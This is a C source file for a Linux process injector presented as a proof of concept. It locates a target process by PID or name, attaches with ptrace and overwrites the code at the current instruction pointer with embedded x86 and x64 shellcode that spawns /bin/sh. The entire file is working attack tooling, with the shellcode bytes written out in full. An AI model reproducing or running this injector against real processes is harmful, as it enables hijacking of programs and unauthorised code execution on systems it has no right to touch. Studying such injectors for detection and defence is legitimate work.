/*
 * Author: ripmeep
 * GitHub: https://github.com/ripmeep/
 * 
 * A linux-based process injector with the aim to override
 * the current %RIP register to execute custom shellcode on
 * the next instruction via process memory (PoC).
 */

/*    INCLUDES    */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <getopt.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

/*    TYPEDEFS    */
typedef struct __pid_info
{
    pid_t   pid;
    char*   cmdline;
} pid_info_t;

/*    GLOBAL DEFS    */
// 64 bit shellcode /bin/sh
unsigned char SHELLCODE_X64[] = { 0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,
	                              0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x08,0x00,
	                              0x00,0x00,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x56,0x57,0x48,0x89,0xe6,
	                              0x0f,0x05 };

// 32 bit shellcode /bin/sh
unsigned char SHELLCODE_X86[] = { 0x6a,0x0b,0x58,0x99,0x52,0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68,
	                              0x00,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x08,0x00,0x00,0x00,0x2f,
	                              0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x57,0x53,0x89,0xe1,0xcd,0x80 };

struct __pid_info* getpid_info(pid_t pid)
{
    char                cmdline_path[1024];
    char*               cmdline;
    size_t              sz;
    FILE*               fptr;
    struct __pid_info*  pi;

    sz = 1024;
    cmdline = malloc(sz);

    snprintf(cmdline_path,
             sizeof(cmdline_path),
             "/proc/%d/cmdline",
             pid);

    fptr = fopen(cmdline_path, "r");

    if (!fptr)
        return NULL;

    if ((getline(&cmdline, &sz, fptr)) > 0)
    {
        pi = (struct __pid_info*)malloc( sizeof(struct __pid_info) );
        pi->pid = pid;
        pi->cmdline = strdup(cmdline);

        free(cmdline);
        fclose(fptr);

        return pi;
    }

    return NULL;
}

__attribute__((__pure__)) struct __pid_info* getpid_info_by_name(const char* __restrict__ pname)
{
    DIR*            dir;
    struct dirent*  de;
    pid_t           pid;
    char            cmdline_path[1024];
    char*           cmdline;
    FILE*           fptr;
    size_t          sz;

    dir = opendir("/proc");
    sz = 1024;
    cmdline = malloc(sz);

    if (dir)
    {
        de = NULL;

        while ((de = readdir(dir)) != 0)
        {
            if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
                continue;

            pid = strtoul(de->d_name, NULL, 10);

            if (pid)
            {
                memset( cmdline_path, 0, sizeof(cmdline_path) );

                snprintf(cmdline_path,
                         sizeof(cmdline_path),
                         "/proc/%d/cmdline",
                         pid);

                fptr = fopen(cmdline_path, "r");

                if (fptr != NULL)
                {
                    if (getline(&cmdline, &sz, fptr) > 0)
                    {
                        if (strstr(cmdline, pname) != 0)
                            return getpid_info(pid);
                    }
                }

                fclose(fptr);
            }
        }

        closedir(dir);
    }

    return 0;
}

void show_usage(const char* __restrict__ arg)
{
    fprintf(stderr,
            "Usage: $ %s -p [PID]\nOr   : $ %s -n [PROCESS NAME]\n",
            arg,
            arg);

    fflush(stderr);

    exit(1);
}

int main(int argc, char** argv)
{
    int                     p, n, c;
    pid_info_t*             pi;
    char*                   pname;
    unsigned char*          sc;
    size_t                  scz;
    int64_t                 bw;
    struct user_regs_struct ur;

	if (argc < 2)
	{
        show_usage(argv[0]);

		return 1;
	}

    p = 0;
    n = 0;

    while ((c = getopt(argc, argv, "p:n:")) != -1)
    {
        switch (c)
        {
            case 'p':
                p = 1;
                pname = optarg;

                break;
            case 'n':
                n = 1;
                pname = optarg;

                break;
            case '?':
                show_usage(argv[0]);
            
                return 1;
            default:
                abort();
        }
    }

    if (!p && !n)
    {
        show_usage(argv[0]);

        return 1;
    }

    printf("Searching process information for '%s'...\n", pname);

    // If process ID was specifically specified (takes presidence)
    pi = p ? getpid_info( strtoul(pname, NULL, 10) ): getpid_info_by_name(pname);

    if (!pi)
    {
        fprintf(stderr, "Cannot find PID information for '%s'\n", pname);

        return 1;
    }

    printf("Injecting into PID %d [%s]\n", pi->pid, pi->cmdline);

    sc = ((size_t) - 1 > 0xFFFFFFFFUL) ? SHELLCODE_X64 : SHELLCODE_X86;

    if ((size_t) - 1 > 0xFFFFFFFFUL)
    {
        sc = (unsigned char*)SHELLCODE_X64;
        scz = sizeof(SHELLCODE_X64);
    } else
    {
        sc = (unsigned char*)SHELLCODE_X86;
        scz = sizeof(SHELLCODE_X86);
    }

    printf("%s bit system detected - using x86%s shellcode\n", (sc == SHELLCODE_X64) ? "64" : "32", (sc == SHELLCODE_X86) ? "" : "_64");

    bw = 0;

    if (ptrace(PTRACE_ATTACH,
                pi->pid,
                NULL,
                0) < 0)
    {
        fprintf(stderr, "Failed to attach to PID %d\n", pi->pid);
        
        return 1;
    }

    wait(NULL);

    printf("Attached to PID %d\n", pi->pid);

    if (ptrace(PTRACE_GETREGS,
               pi->pid,
               0,
               &ur) < 0)
    {
        fprintf(stderr, "Failed to get current registers of PID %d\n", pi->pid);

        return 1;
    }

    printf("Enumerated current registers (RIP -> 0x%016llX)\n", ur.rip);

    for (size_t i = 0; i < scz; i++)
    {
        ptrace(PTRACE_POKETEXT,
               pi->pid,
               ur.rip + i,
               *(char*)(sc + i));

        printf("\rInjected byte(s) %03ld", i);
        fflush(stdout);
    }

    printf("\nDetaching from PID %d\n", pi->pid);

    ptrace(PTRACE_DETACH,
           pi->pid,
           NULL,
           0);

	return 0;
}
